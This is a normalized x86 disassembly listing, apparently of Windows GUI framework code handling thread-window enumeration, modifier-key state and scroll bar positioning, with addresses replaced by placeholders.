mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4573b7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_457380
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4572c4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4573be
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4573c8
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4027ac
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_457400
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_457464
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_457400
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4574c0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4574e0
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4574c0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45750c
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45df6c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45e3dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407fb8
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df58
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45e3c8
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407fb8
test eax eax
je r-xdata
sub_45758c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4575e0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45761c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_457668
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4576c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455224
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0x8 ]
pop edx
call sub_407fb8
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4576cd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_4576d8
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_457700
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_457771
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4576d8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457778
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
sub_457780
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_457810
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a740
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4580d8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4580b8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_457f68
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_457860
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_457a18
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_440f18
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_457f68
xor edx edx
mov eax ebx
call sub_457f68
jmp r-xdata
sub_457898
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a444
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_457904
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a444
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45796c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4580a0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_443dbc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4580a0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_443d80
call sub_457904
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_443d80
call sub_457898
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_457a18
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4470c4
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_457a50
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_457a84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_457a50
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_457a50
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_457b00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_457a84
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4402a8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_457a84
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4402ec
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_457b98
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_457bf8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_457dc9 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457b00
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457b00
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
push ebp
call sub_457b98
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
push ebp
call sub_457b98
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c74
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457f68
jmp r-xdata
sub_457ef0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4585e0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_457f68
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4470c4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4470c4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_446c44
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_446c44
jmp r-xdata
call sub_4576d8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45802c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4585e0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4580e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call sub_42c100
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call sub_42c100
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call sub_42c100
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_4229f8
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call sub_42c100
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
call sub_42c100
sub_4581ec
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_457b00
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_457b00
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4580e4
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4470c4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_457f68
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_457b00
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_458304
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_442db8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_457780
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_457780
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_45837c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40321c
mov eax [ esi + 0x20c ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_442edc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4583c8
push ebx
mov ebx eax
mov eax ebx
call sub_444044
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4585e0
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c13c
test al al
jne r-xdata
mov eax ebx
call sub_4470c4
push eax
call sub_42c134
sub_458408
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_458560
mov ecx edi
mov edx esi
mov eax ebx
call sub_44378c
pop edi
pop esi
pop ebx
retn
sub_458448
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_458550
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4402a8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
